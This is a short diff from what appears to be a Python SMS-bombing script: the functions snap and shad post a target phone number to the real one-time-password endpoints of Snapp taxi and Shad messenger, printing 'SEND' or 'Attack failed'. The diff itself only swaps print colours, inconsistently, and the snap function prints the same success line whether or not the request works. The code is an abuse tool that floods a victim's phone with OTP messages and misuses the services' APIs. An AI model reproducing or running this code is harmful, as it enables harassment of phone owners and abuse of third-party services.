@@ -41,9 +41,9 @@ def snap(phone):
     try:
         snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD)
         if "OK" in snapR.text:
-            print (Fore.Purple+"[+]snap SEND")
+            print (Fore.GREEN+"[+]snap SEND")
         else:
-            print (Fore.Purple+"[+]snap SEND")
+            print (Fore.GREEN+"[+]snap SEND")
     except:
         print ("not send")
 
@@ -54,7 +54,7 @@ def shad(phone):
     try:
         shadR = requests.post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD)
         if "OK" in shadR.text:
-            print (Fore.Purple+"shad Send")
+            print (Fore.Green+"shad Send")
         else:
             print ("Attack failed :(")
     except:
